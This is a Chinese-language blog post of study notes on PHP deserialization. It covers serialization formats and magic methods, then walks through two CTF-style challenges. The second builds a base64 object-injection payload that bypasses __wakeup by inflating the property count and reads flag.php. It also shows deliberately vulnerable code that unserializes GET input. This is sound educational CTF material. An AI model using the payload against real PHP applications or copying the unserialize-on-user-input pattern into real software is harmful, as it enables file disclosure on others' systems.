---
title: "PHP反序列化学习"
date: 2019-08-17T13:52:31+08:00
draft: false
tags: ['unserialize','PHP']
categories: ['代码审计']
---

记录下PHP反序列化漏洞学习笔记。

<!--more-->

## 简介

php序列化 化对象为压缩格式化的字符串

反序列化 将压缩格式化的字符串还原

php序列化是为了将对象或者变量永久存储的一种方案。

## 序列化

在了解反序列化之前我们首先要知道什么是序列化。

在php中，序列化函数是`serialize()`，我们先来写一个简单的序列化。

```php
<?php
class User {
    public $name;
    private $sex;
    protected $money = 1000;

    public function __construct($data, $sex) {
        $this->data = $data;
        $this->sex = $sex;
    }
}
$number = 66;
$str = 'Y4er';
$bool = true;
$null = NULL;
$arr = array('a' => 1, 'b' => 2);
$user = new User('jack', 'male');

var_dump(serialize($number));
echo '<hr>';
var_dump(serialize($str));
echo '<hr>';
var_dump(serialize($bool));
echo '<hr>';
var_dump(serialize($null));
echo '<hr>';
var_dump(serialize($arr));
echo '<hr>';
var_dump(serialize($user));
```

在这里我们分别序列化了数字、字符串、布尔值、空、数组、对象。看下输出结果

```php
string(5) "i:66;"
string(11) "s:4:"Y4er";"
string(4) "b:1;"
string(2) "N;"
string(30) "a:2:{s:1:"a";i:1;s:1:"b";i:2;}"
string(99) "O:4:"User":4:{s:4:"name";N;s:9:"Usersex";s:4:"male";s:8:"*money";i:1000;s:4:"data";s:4:"jack";}"
```

以此我们知道序列化不同类型的格式为

- `Integer` : i:value;
- `String` : s:size:value;
- `Boolean` : b:value;(保存1或0)
- `Null` : N;
- `Array` : a:size:{key definition;value definition;(repeated per element)}
- `Object` : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}

在这里需要注意一点就是object的private和protected属性的长度问题：

```php
string(99) "O:4:"User":4:{s:4:"name";N;s:9:"Usersex";s:4:"male";s:8:"*money";i:1000;s:4:"data";s:4:"jack";}"
```

可以看到Usersex的长度为9，是因为php序列化属性值时，如果是private或者protected会自动在类名两边添加一个空字节，如果是url编码用%00，如果是ASCII编码用\00，都是表示一个空字节。

1. %00User%00sex 表示 private
2. %00*%00money 表示protected

## 反序列化

反序列化是将字符串转换为原来的变量或对象，简单写一个例子。

```php
<?php

class User
{
    public $name='Y4er';

    function __wakeup()
    {
        echo $this->name;
    }
}

$me = new User();
echo serialize($me);
echo '<hr>';
unserialize($_GET['id']);
```

![20190817142528](https://y4er.com/img/uploads/20190817142528.png)

可以看到，我们将序列化之后的字符串通过id传给`unserialize`函数之后，执行了`__wakeup()`函数，输出了`Y4er`字符串。

那么我们如果改变`O:4:"User":1:{s:4:"name";s:4:"Y4er";}`中的`Y4er`字符串，精心构造一个对象是不是可以随意输出呢？答案当然是肯定的，所以反序列化漏洞的产生就在于`__wakeup`中存在可控字段。

那么`__wakeup`是什么函数呢？为什么他会自己运行呢？有没有其他类似的函数呢？

## 魔术方法

在php中，有着一系列的魔术方法，他们和C#中的构造方法相似，都是在某一条件满足下自动运行，一般用于初始化对象。我们在这里列举一些

```
__construct()//创建对象时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__invoke() //当脚本尝试将对象调用为函数时触发
__toString() //把类当作字符串使用时触发
__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
```

我们在上文中用到了`__wakeup`函数，在使用`unserialize()`时自动输出了`$this->name`。在了解完魔术方法之后，我们来看几道题。

## D0g3 热身反序列化

题目如下，我稍微修改了一下。

```php
<?php
$KEY = "D0g3!!!";
$str = $_GET['str'];
if (unserialize($str) === "$KEY")
{
    echo "You get Flag!!!";
}
show_source(__FILE__);
```

很简单的一道题，要求就是通过get传进去的str参数经过反序列化之后要等于`D0g3!!!`，那么我们直接将`D0g3!!!`序列化一下，然后通过str参数就可以了。

```php
echo serialize("D0g3!!!");
```

输出`s:7:"D0g3!!!";`

然后访问`http://php.local/unserialize.php?str=s:7:"D0g3!!!";`拿到flag。

## __wakeup反序列化对象注入

题目代码

```php
<?php

class SoFun
{
    protected $file = 'index.php';

    function __destruct()
    {
        if (!empty($this->file)) {
            if (strchr($this->file, "\\") === false && strchr($this->file, '/') === false) {
                show_source(dirname(__FILE__) . '/' . $this->file);
            } else {
                die('Wrong filename.');
            }
        }
    }

    function __wakeup()
    {
        $this->file = 'index.php';
    }

    public function __toString()
    {
        return '';
    }
}

if (!isset($_GET['file'])) {
    show_source('index.php');
} else {
    $file = base64_decode($_GET['file']);
    echo unserialize($file);
}
?>   #<!--key in flag.php-->
```

首先阅读题意，可以看到要通过base64传递file参数来反序列化将`$file`变量改变为`flag.php`，从而读出flag。

但是有一个问题，`__wakeup`函数是在反序列化时就执行，而`__destruct`是在对象销毁时执行，也就是说`__wakeup`比`__destruct`先执行，而`__wakeup`会执行`$this->file = 'index.php';`，所以我们现在要想办法将file变成`flag.php`并且要绕过`__wakeup`函数调用`__destruct`函数。

这里用到了一个PHP反序列化对象注入漏洞，当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过`wakeup`方法的执行。

首先准备反序列化对象

```php
$i = new SoFun();
echo serialize($i);
```

`O:5:"SoFun":1:{s:7:"*file";s:9:"index.php";}`

我们需要将file的%00补上

`O:5:"SoFun":1:{s:7:"%00*%00file";s:9:"index.php";}`

修改flag.php

`O:5:"SoFun":1:{s:7:"%00*%00file";s:8:"flag.php";}`

绕过`wakeup`

`O:5:"SoFun":2:{s:7:"%00*%00file";s:8:"flag.php";}`

然后需要urldecode一下，将%00转为空字节，最后base64之后就是payload了

`http://php.local/index.php?file=Tzo1OiJTb0Z1biI6Mjp7czo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9`

## 参考链接

- [反序列化审计](https://github.com/aleenzz/php_bug_wiki/blob/master/1.9.反序列化审计.md)
- https://xz.aliyun.com/t/3674
- [深度剖析PHP序列化和反序列化](https://www.cnblogs.com/youyoui/p/8610068.html)
- https://www.freebuf.com/news/172507.html

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**